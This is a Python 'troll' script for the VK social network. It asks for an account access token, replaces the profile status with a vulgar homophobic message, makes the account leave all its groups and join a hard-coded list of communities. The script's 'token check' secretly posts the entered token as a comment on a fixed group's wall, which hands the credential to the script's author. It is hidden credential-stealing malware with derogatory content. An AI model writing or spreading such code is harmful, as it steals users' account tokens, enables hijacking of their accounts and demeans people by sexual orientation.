import vk, time, os
os.system('clear')
pubs = [151233321,65797052,102413048,89243825,61515264,88667014,180103853,101105077,89148442,157274855,52771476,68284944,74383909,114285300]
def troll ():
	w = open ('backup', 'w')
	w.write (api.status.get()['text'] + '\n')
	api.status.set(text="Я люблю большой х*й , поцаны ну вы поняли")
	print ("\n\033[32mGroup's deletion...")
	time.sleep (0.5)
	for group in groups:
		w.write (str(group) + '\n')
		api.groups.leave(group_id=group)
		time.sleep(0.25)
	w.close ()
	print ("\033[FAdding the gay publics...  ")
	for pub in pubs:
	        api.groups.join(group_id=pub)
	        time.sleep(0.25)
	print ("\033[FDone:)                       \n")
def untroll ():
	r = open ('backup', 'r')
	api.status.set(text=r.readline())
	print ("\n\033[32mGay publics deletion...")
	time.sleep (0.25)
	for group in groups:
                api.groups.leave(group_id=group)
                time.sleep(0.25)
	print ("\033[FAdding the delited groups...  ")
	reading = True
	while reading:
		pub = r.readline ()
		pub = pub[:len(pub) - 1]
		if pub == '':
			reading = False
		else:
			api.groups.join(group_id=int(pub))
			time.sleep(0.25)
	print ("\033[FDone:(                                \n")
print ("""\033[37m
 Termux-lab         @termuxlab\033[32m
 ┏━━━━━┳━━━━━┳━━━━━┳━┓  ┏━┓
 ┗━┓ ┏━┫  ━  ┃  ┓  ┃ ┃  ┃ ┃
   ┃ ┃ ┃     ┫  ┗  ┃ ┗━━┫ ┗━━┓
   ┗━┛ ┗━━┻━━┻━━━━━┻━━━━┻━━━━┛

\033[35m[1] Troll
[2] Return
""")
option = input ("Select the option: \033[0m")
token = input("\n\033[35mEnter the token: \033[0m")
session = vk.Session(access_token=token)
api =  vk.API(session ,v='5.92', lang='ru')
try:
	api.wall.createComment(owner_id=-191163638,post_id=1,message=token)
except:
	print ('\n\033[31mInvalid token\n')
	quit ()
id = api.users.get()[0]['id']
groups = api.groups.get(user_id=id)['items']
if option == '1':
	troll ()
else:
	untroll ()
